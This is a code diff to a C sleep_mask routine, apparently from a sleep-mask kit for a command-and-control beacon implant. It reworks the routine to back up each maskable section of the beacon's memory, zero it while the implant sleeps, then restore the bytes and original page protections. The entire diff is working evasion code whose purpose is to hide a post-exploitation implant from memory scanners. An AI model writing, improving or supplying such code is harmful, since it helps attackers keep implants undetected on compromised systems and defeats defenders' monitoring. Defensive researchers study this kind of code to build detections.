@@ -44,7 +44,7 @@ static ULONG_PTR dispatch_call( PFUNCTION_CALL fc ) {
  * beaconInfo:    describes the beacon image, heap records, and memory regions
  * functionCall:  the API call to execute (with optional masking)
  */
-VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
+VOID sleep_mask( PBEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
 
     if ( ! functionCall )
         return;
@@ -56,58 +56,75 @@ VOID sleep_mask( PSM_BEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {
     }
 
     /*
-     * Sleep mask path: back up beacon memory, erase originals, sleep, restore.
+     * Sleep mask path: back up beacon memory sections, erase originals,
+     * sleep, restore.
      */
 
-    PVOID backups[SM_MAX_REGIONS] = { 0 };
+    PVOID sec_backups[6 * 8] = { 0 };
     DWORD oldProtect = 0;
+    int idx = 0;
 
-    /* Back up each region and zero the original memory */
-    for ( int i = 0; i < beaconInfo->region_count; i++ ) {
-        PVOID  base = beaconInfo->regions[i].base;
-        DWORD  size = beaconInfo->regions[i].size;
-
-        if ( ! base || ! size )
+    /* Back up each maskable section and zero the original memory */
+    for ( int r = 0; r < 6; r++ ) {
+        ALLOCATED_MEMORY_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
+        if ( ! reg->AllocationBase || reg->RegionSize == 0 ) {
+            idx += 8;
             continue;
+        }
+        for ( int s = 0; s < 8; s++, idx++ ) {
+            ALLOCATED_MEMORY_SECTION *sec = &reg->Sections[s];
+            if ( ! sec->BaseAddress || sec->VirtualSize == 0 || ! sec->MaskSection )
+                continue;
 
-        backups[i] = VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-        if ( ! backups[i] )
-            continue;
+            DWORD size = (DWORD) sec->VirtualSize;
 
-        /* Copy region contents to backup */
-        for ( DWORD j = 0; j < size; j++ )
-            ((PBYTE) backups[i])[j] = ((PBYTE) base)[j];
+            sec_backups[idx] = VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+            if ( ! sec_backups[idx] )
+                continue;
 
-        /* Make region writable so we can erase it */
-        VirtualProtect( base, size, PAGE_READWRITE, &oldProtect );
+            /* Copy section contents to backup */
+            for ( DWORD j = 0; j < size; j++ )
+                ((PBYTE) sec_backups[idx])[j] = ((PBYTE) sec->BaseAddress)[j];
 
-        /* Zero the original memory byte-by-byte */
-        for ( DWORD j = 0; j < size; j++ )
-            ((PBYTE) base)[j] = 0;
+            /* Make section writable so we can erase it */
+            VirtualProtect( sec->BaseAddress, size, PAGE_READWRITE, &oldProtect );
+
+            /* Zero the original memory byte-by-byte */
+            for ( DWORD j = 0; j < size; j++ )
+                ((PBYTE) sec->BaseAddress)[j] = 0;
+        }
     }
 
     /* Execute the queued API call (e.g. WaitForSingleObject) */
     functionCall->retValue = dispatch_call( functionCall );
 
-    /* Restore each region from its backup */
-    for ( int i = 0; i < beaconInfo->region_count; i++ ) {
-        PVOID  base = beaconInfo->regions[i].base;
-        DWORD  size = beaconInfo->regions[i].size;
-
-        if ( ! base || ! size || ! backups[i] )
+    /* Restore each section from its backup */
+    idx = 0;
+    for ( int r = 0; r < 6; r++ ) {
+        ALLOCATED_MEMORY_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
+        if ( ! reg->AllocationBase || reg->RegionSize == 0 ) {
+            idx += 8;
             continue;
+        }
+        for ( int s = 0; s < 8; s++, idx++ ) {
+            ALLOCATED_MEMORY_SECTION *sec = &reg->Sections[s];
+            if ( ! sec->BaseAddress || sec->VirtualSize == 0 || ! sec_backups[idx] )
+                continue;
 
-        /* Make region writable for restore */
-        VirtualProtect( base, size, PAGE_READWRITE, &oldProtect );
+            DWORD size = (DWORD) sec->VirtualSize;
 
-        /* Copy backup contents back */
-        for ( DWORD j = 0; j < size; j++ )
-            ((PBYTE) base)[j] = ((PBYTE) backups[i])[j];
+            /* Make section writable for restore */
+            VirtualProtect( sec->BaseAddress, size, PAGE_READWRITE, &oldProtect );
 
-        /* Re-apply original protection */
-        VirtualProtect( base, size, beaconInfo->regions[i].protect, &oldProtect );
+            /* Copy backup contents back */
+            for ( DWORD j = 0; j < size; j++ )
+                ((PBYTE) sec->BaseAddress)[j] = ((PBYTE) sec_backups[idx])[j];
 
-        /* Free the backup */
-        VirtualFree( backups[i], 0, MEM_RELEASE );
+            /* Re-apply original protection */
+            VirtualProtect( sec->BaseAddress, size, sec->CurrentProtect, &oldProtect );
+
+            /* Free the backup */
+            VirtualFree( sec_backups[idx], 0, MEM_RELEASE );
+        }
     }
 }
